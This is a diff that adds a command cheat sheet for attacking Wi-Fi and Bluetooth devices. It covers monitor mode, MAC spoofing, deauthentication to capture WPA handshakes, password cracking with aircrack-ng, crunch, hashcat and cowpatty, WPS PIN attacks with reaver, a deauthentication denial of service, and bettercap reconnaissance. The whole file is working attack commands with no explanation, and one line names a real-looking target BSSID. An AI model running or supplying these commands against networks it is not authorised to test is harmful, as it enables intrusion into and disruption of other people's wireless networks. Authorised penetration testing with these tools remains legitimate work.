@@ -1,1 +1,47 @@
+sudo iwconfig wlan0 txpower 30
+sudo airmon-ng start wlan0
+sudo airmon-ng check kill
+sudo airodump-ng wlan0mon
+sudo aireplay-ng -9 wlan0mon
+
+#Hidden SSID
+sudo airmon-ng
+ifconfig
+sudo airmon-ng start wlan0
+sudo airodump-ng wlan0mon
+sudo airodump-ng -c 11 wlan0mon
+
+#Change MAC
+sudo ifconfig wlan0 down
+sudo ifconfig wlan0 | grep HW
+sudo ifconfig wlan0 hw ether 38:33:15:xx:xx:xx
+sudo ifconfig wlan0 up
+sudo macchanger wlan0 -e
+sudo macchanger wlan0 -r
+
+#Bruteforce attacks
+sudo airodump-ng --bssid F0:7D:68:44:61:EA -c 11 --showack --output-format pcap --write <OUTPUT LOCATION> wlan0mon
+sudo aireplay-ng -0 10 -a <BSSID> -c <STATION ID> wlan0mon
+sudo aircrack-ng -w passwordlist -b BSSID <OUTPUT LOCATION>Output.cap
+sudo crunch 5 25 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 | aircrack-ng --bssid (MAC address) -w nameofthewifi.cap
+sudo aircrack-ng nameofthewifi.cap -j <output file>
+sudo hashcat -m 2500 <filename>.hccapx <wordlist>
+sudo john –w=<dictionaryfile> --stdout | sudo cowpatty -r yourhandshake.cap -d - -s WIFIESSIDS
+
+sudo wash -i wlan0mon --ignore-fcs
+sudo reaver -i wlan0mon -b (BSSID) -vv
+
+#Denial of service
+
+sudo airmon-ng start wlan0
+sudo aireplay-ng -0 0 -a (bssid) -c (station ID) wlan0mon
+
+#Bettercap
+
+sudo airmon-ng start wlan0
+sudo bettercap --iface wlan0mon
+  wifi.recon
+
+#Bluetooth
+sudo sdptool browse <MAC address of the target>
 
